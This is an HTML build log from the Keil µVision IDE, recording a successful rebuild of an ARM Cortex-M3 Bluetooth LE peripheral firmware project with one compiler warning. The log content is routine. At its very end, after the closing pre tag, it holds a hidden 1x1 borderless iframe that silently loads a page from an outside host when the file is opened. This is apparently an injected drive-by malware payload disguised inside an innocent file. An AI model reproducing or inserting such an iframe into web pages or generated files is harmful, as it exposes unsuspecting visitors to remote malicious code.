<html>
<body>
<pre>
<h1>µVision Build Log</h1>
<h2>Tool Versions:</h2>
IDE-Version: ¦ÌVision V5.25.3.0
Copyright (C) 2018 ARM Ltd and ARM Germany GmbH. All rights reserved.
License Information: qwerty qwerty, qwerty, LIC=EPPPC-7W10Q-TLZCD-8FITJ-HFE8W-VZI2Z
 
Tool Versions:
Toolchain:       MDK-ARM Professional  Version: 5.14.0.0
Toolchain Path:  C:\Keil_v5\ARM\ARMCC\Bin
C Compiler:      Armcc.exe V5.05 update 1 (build 106)
Assembler:       Armasm.exe V5.05 update 1 (build 106)
Linker/Locator:  ArmLink.exe V5.05 update 1 (build 106)
Library Manager: ArmAr.exe V5.05 update 1 (build 106)
Hex Converter:   FromElf.exe V5.05 update 1 (build 106)
CPU DLL:         SARMCM3.DLL V5.14.0.0
Dialog DLL:      DCM.DLL V1.13.1.0
Target DLL:      Segger\JL2CM3.dll V2.99.13.0
Dialog DLL:      TCM.DLL V1.14.4.0
 
<h2>Project:</h2>
E:\dev\projects\self\¸»ÜÇÀ¤ÆÀ²â\code\FR801xH-SDK_new\examples\dev1.0\ble_simple_peripheral\keil\ble_simple_peripheral.uvprojx
Project File Date:  03/25/2020

<h2>Output:</h2>
*** Using Compiler 'V5.05 update 1 (build 106)', folder: 'C:\Keil_v5\ARM\ARMCC\Bin'
Rebuild target 'ble_simple_peripheral'
compiling proj_main.c...
compiling ble_simple_peripheral.c...
compiling user_task.c...
compiling button.c...
compiling valuepack.c...
compiling speaker_service.c...
compiling simple_gatt_service.c...
..\..\..\..\components\ble\profiles\ble_simple_profile\simple_gatt_service.c(329): warning:  #550-D: variable "ret" was set but never used
                int8_t ret=0;
..\..\..\..\components\ble\profiles\ble_simple_profile\simple_gatt_service.c: 1 warning, 0 errors
compiling lcd.c...
compiling speaker.c...
compiling adpcm_ms.c...
compiling decoder.c...
compiling sht3x.c...
compiling sht3x_sw_i2c.c...
compiling sht3x_common.c...
compiling sht3x_sw_i2c_implementation.c...
compiling capb18-001.c...
compiling gyro_driver.c...
compiling driver_iic.c...
compiling driver_pmu.c...
compiling driver_keyscan.c...
compiling driver_pmu_qdec.c...
compiling driver_rtc.c...
compiling driver_uart.c...
compiling driver_wdt.c...
compiling driver_i2s.c...
compiling driver_ssp.c...
compiling driver_codec.c...
compiling driver_exti.c...
compiling driver_timer.c...
compiling core_cm3_isr.c...
assembling app_boot_vectors.s...
compiling patch.c...
linking...
Program Size: Code=105700 RO-data=237016 RW-data=2388 ZI-data=5024  
After Build - User command #1: fromelf.exe  --text  -c -o Output/ble_simple_peripheral.txt  Objects/ble_simple_peripheral.axf
After Build - User command #2: fromelf.exe  --bin -o Output/ble_simple_peripheral.bin  Objects/ble_simple_peripheral.axf
".\Objects\ble_simple_peripheral.axf" - 0 Error(s), 1 Warning(s).

<h2>Software Packages used:</h2>

Package Vendor: ARM
                http://www.keil.com/pack/ARM.CMSIS.5.4.0.pack
                ARM.CMSIS.5.4.0
                CMSIS (Cortex Microcontroller Software Interface Standard)
   * Component: CORE Version: 5.1.2

<h2>Collection of Component include folders:</h2>
  .\RTE\_ble_simple_peripheral
  C:\Keil_v5\ARM\PACK\ARM\CMSIS\5.4.0\CMSIS\Core\Include
  C:\Keil_v5\ARM\PACK\ARM\CMSIS\5.4.0\Device\ARM\ARMCM3\Include

<h2>Collection of Component Files used:</h2>

   * Component: ARM::CMSIS:CORE:5.1.2
Build Time Elapsed:  00:00:13
</pre>
<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
</body>
</html>
